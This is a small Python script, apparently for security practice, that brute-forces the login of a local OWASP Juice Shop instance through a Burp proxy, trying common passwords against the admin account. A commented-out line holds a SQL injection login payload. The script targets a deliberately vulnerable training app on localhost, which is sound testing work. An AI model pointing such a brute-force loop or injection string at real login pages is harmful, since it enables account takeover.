import requests
import time

# Using OSWAP Juice for brute force testing
# Once front and back end are created values will change
TARGET_URL = "http://127.0.0.1:3000/rest/user/login"    # The target port to be sent to burpsuite
SUCCESS_INDICATOR = "Success"

# usernames = ["admin' or '1'='1'--"] Juice swap SQL injection
usernames = ["admin@juice-sh.op"]
passwords = ["password", "123456", "admin", "pwnd", "letmein"]

proxies = {
    "http": "http://127.0.0.1:8081"
}

headers = {
    "Content-Type": "application/json"
}

session = requests.Session()
session.proxies = proxies

# for i in range(10):    Complete when sending 100 attacks
for username in usernames:
    for password in passwords:
        payload = {
            "email": username,
            "password": password
        }
        print(f"Sending to Burp...\nUsername: {username}\nPassword: {password}")

        response = session.post(
            TARGET_URL,
            json=payload,
            headers=headers
        )

        if (response.status_code == 200):
            print("SUCCESS!\n")
            print(f"Credentials:\nUsername: {username}\nPassword: {password}")
            print("Status:", response.status_code)
            break
        else:
            print("Status:", response.status_code)
            print("Failed!\n")

        time.sleep(0.4)
